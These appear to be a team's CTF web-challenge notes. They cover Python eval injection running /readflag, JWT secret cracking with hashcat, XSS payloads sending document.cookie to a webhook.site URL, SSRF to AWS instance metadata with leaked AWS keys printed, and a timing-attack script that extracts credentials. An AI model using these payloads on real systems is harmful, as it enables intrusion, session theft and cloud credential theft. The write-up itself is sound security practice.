
> Dump of docs during ctf (for web only, the others are in team google docs.)
# pyrunner

> Command injection

Testing payload in local python
```
print("123", str(eval("exec('import os'),os.system('123')")))
```

```
{"template":"1","arguments":{"title":"\"),print(\"123\", str(evevalal(\"exexecec('impimportort ooss'),ooss.system('/readflag')\")))#","host":"eee","port":"eee"}}
```


# profile pic

```
hashcat jwtHashes.txt -m 16500 D:\Tools\Wordlists\realuniq.lst
```

![](images/Pasted%20image%2020221202232913.png)

```
profile-pic.php?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ2ZXJpZmllZCI6ZmFsc2UsInN1YiI6IjExMjA4NDc1NDIxNzYxNzM4MDAxOCJ9.kMcpEMt2vM8tf5XV9F0tdjH6zn6OVirLX29knIqBQgH9EvHMkcGiKWzSonRuxUPkiLLusM94YHDIx-Z4_KPWTw
```

Password - `0077secret0077`

# Blog Post 1

```
<img src="" onerror='window.location="https://webhook.site/0bef1c67-3a60-4299-abc2-6ac3da6cb5ac/?" + document.cookie'/>


<img src="" onerror='console.log("https://webhook.site/0bef1c67-3a60-4299-abc2-6ac3da6cb5ac/?" + document.cookie)'/>
```

![](images/Pasted%20image%2020221203011703.png)

# Blog Post 2


# Secure Note 1

> HTTP Prototype Pollution


```
/fastapi/retrievekey?uid=3&uid=2
```


# Cloud 1

On triggering an error page, the image loaded but the error page is from another URL...

```
http://18.141.147.115:8080/http://169.254.169.254/latest/meta-data/
```

This URL seems to instead load a link after the URL root. Giving us SSRF to the AWS metadata.

```
{
  "Code" : "Success",
  "LastUpdated" : "2022-12-03T04:20:53Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA5G4XMRW74GN6TCFA",
  "SecretAccessKey" : "VKbZns9EFge+liTrj3xFQL1lOix6rhyFQndC5mP0",
  "Token" : "IQoJb3JpZ2luX2VjEJz//////////wEaDmFwLXNvdXRoZWFzdC0xIkgwRgIhAJ/7XAMEjmL0XdyXowxSCwhVzRFLTZHdeAHhdLyR2EyhAiEA5UoXj5tljbw0UNlJtHOh/ry0C5WsEIU7PcsC2m7iVC4q3gQItf//////////ARADGgw5MDgxNjYyMDQ4NjMiDBb6sXXMZy/zmr59WSqyBOb68DVtI4/ILgH6MBRMhlmlDxjYkHIhUzKmrhQc37e5aJK1/UwxdaHwOLNYwV9S+cHx9tj2VQt7dSoYseKs5p9iOyqJd0eUHlzFPPwCbVNiEGWvln2biCXWTs4LBqiadUsWvcP+osHmTYtgR0vypOegW4pyp7ZxYmeql4KckIdoaGCoJ1786OTUWNVAHpiIU17ZhVCfpLifP+tjlpCgNTBXj7NNTpawN0fDVkla+2Dp5jHna/zkdZpxwY6no+ieaqlCNr2S3cPKkz3QwO1tR3Habz5wh7vxP81C/YWCxshhuu782OlO6Ds8rnxyp8uJn3nAEeLF+N1B9yXmtZTkd4eGPaNUs9GtH7IWIKrjUVWq22G0y0aJDG7t2gHZkpWDDVbthpltxyiPw6JDDTWJBrey4mKlhxMXs1xkrT5f69KVStRCUaESmjuFKZAzP2R+0EMoUgcnbRvMr2IHq41fQIwvZZcNctYWkyY+wRtnH8yX5wUSxITKnGntQy9GtNOj4lW6Ci5PXknkAqlKFWtIcdMAr1i3i+rBJwg7wUu/LMggUSSOt4D2jTKP+/E2B5+Oh9x01T7cUv+6Vn2IR5kfNB1hjS4kfwgwoUEF9HkiG40vaNjsgz6ooxDdvH+Yvx3T3ebi7GC+0twAkmwhICzAO/d5uFZ26dT1g/UIJ9UJsyf1NSli5GwvZjLTR1jr1RSIwgQytZz3JOT6dOs8C82ofXRwjg9xDYg3A9sTZn80IblbyLgwh52rnAY6kgLjLRENWLC6cko1YtoJk9skx+5jRDWk1RVOXlEGioKM4XM3lLD1R8JKKxMMt10r9rXa7bpSuvRo1e8XfsftafcDG4gDvCwGGDXyuf2iDNMIzDVPclO2cBN53AWOjCASk+VKUPPK8VqoXSNUKTRJIcA0yfR0YSojCk/2YdNZPWkXDqWM8hTQtw7C3lUSLYylSGVxHVOpVDHHUspnHebAenEDti+6bliks4jkX/E2JQimiKd5Yo2t36tl90tmyr9jJd5+1zNl3p4D9bp1sCmHqNJyXb8+mVw2I1TI3r0sWu+SuKBmnhvki1YBgwqLaBzBy/HSFYmA8aeRrUJBarhk5AKSSjXBxqaxH2NP5PQCbDoC8NuN",
  "Expiration" : "2022-12-03T10:44:02Z"
}
```


# Path of Pain

![](images/Pasted%20image%2020221203211826.png)


# Ticktock

Two parts of this vulnerable function allows us to perform a time based attack on the authentication.

First looking at part (1). If the length matches, no additonal time is added to our response - so gives us the condition

Example -> if `len(username)` equals the `len(input)` -> Then sleep for a while. 
So we will receive the response late. Giving us a "heads up" that our length is correct.

![](images/Pasted%20image%2020221204205016.png)

Let's try enumerating the username length first. We can do so with the following code snippet
```
# For checking len of username
for i in range(1, 20):
    val = ("A" * i)
    r = requests.get(f"http://174.138.28.135:30031/flag?username={val}&password=111")
    print(i,r.elapsed.total_seconds())
```

This essentially tries `A`, `AA`, `AAA` ... until 20 As. Then from this we can see that for 10 As, the time for our response is much longer.
```
0 0.010312
1 0.010637
2 0.010555
3 0.009346
4 0.009651
5 0.010921
6 0.010992
7 0.010207
8 0.009022
9 0.009504
10 0.111399 < --- more time needed so len of username is 10.
11 0.011147
12 0.009972
13 0.009737
14 0.010169
15 0.010247
16 0.010032
17 0.011412
18 0.010872
19 0.011442
```

Time based binary search.

```
...
http://174.138.28.135:30031/flag?username=0p3nr4leay&password=111 y 0.565102
http://174.138.28.135:30031/flag?username=0p3nr4leaz&password=111 z 0.565232
http://174.138.28.135:30031/flag?username=0p3nr4lea{&password=111 { 0.563831
http://174.138.28.135:30031/flag?username=0p3nr4lea|&password=111 | 0.565666
http://174.138.28.135:30031/flag?username=0p3nr4lea}&password=111 } 0.562699
0p3nr4leaf
```

Username - `0p3nr4leaf`

Running the script to enumerate the length of password independently
```
0 0.61581
1 0.613806
2 0.614158
3 0.613894
4 0.616026
5 0.613855
6 0.613345
7 0.613669
8 0.615841
9 0.617617
10 0.614576
11 0.614834
12 0.614008
13 0.612199
14 0.615014
15 0.613957
16 0.616048
17 0.614064
18 0.61632
19 0.613628
20 0.715641 < --- Highest time. So 20 is the length!
21 0.613569
22 0.614908
23 0.612637
24 0.614775
25 0.61516
26 0.614424
27 0.616425
28 0.613929
29 0.613886
```

![](images/Pasted%20image%2020221205221102.png)

![](images/Pasted%20image%2020221204221521.png)

## Exploit Script

``` script.py
import requests
import string

target = "157.245.52.169:31121"

userlen = 0
currHigh = 0.0
for i in range(0, 20):
    val = ("A" * i)
    r = requests.get(f"http://{target}/flag?username={val}&password=111")
    if currHigh < r.elapsed.total_seconds():
        currHigh = r.elapsed.total_seconds()
        userlen = i
    print(i,r.elapsed.total_seconds())

username = "0p3nr4leaf"
for idx in range(len(username), userlen):
    highestTimeChar = ""
    currHigh = 0.0
    for i in string.ascii_letters + string.digits:
        padding = (userlen - idx - 1) * "A"
        url = f"http://{target}/flag?username={username}{i}{padding}&password=111"
        r = requests.get(url)
        if currHigh < r.elapsed.total_seconds():
            currHigh = r.elapsed.total_seconds()
            highestTimeChar = i
        print(url, i,r.elapsed.total_seconds())
    username += highestTimeChar

print("Username is " + username)

passlen = 0
currHigh = 0.0
for i in range(0, 30):
    val = ("A" * i)
    r = requests.get(f"http://{target}/flag?username={username}&password={val}")
    if currHigh < r.elapsed.total_seconds():
        currHigh = r.elapsed.total_seconds()
        passlen = i
    print(i,r.elapsed.total_seconds())

password = ""
for idx in range(len(password), passlen):
    highestTimeChar = ""
    currHigh = 0.0
    for i in string.ascii_letters + string.digits:# range(32, 126):
        padding = (passlen - idx - 1) * "A"
        url = f"http://{target}/flag?username={username}&password={password}{i}{padding}"
        r = requests.get(url)
        if currHigh < r.elapsed.total_seconds():
            currHigh = r.elapsed.total_seconds()
            highestTimeChar = i
        print(url, i,r.elapsed.total_seconds())
    password += highestTimeChar

print("Password is " + password)


print("Final Credentials")
print(username + ":" + password)
```
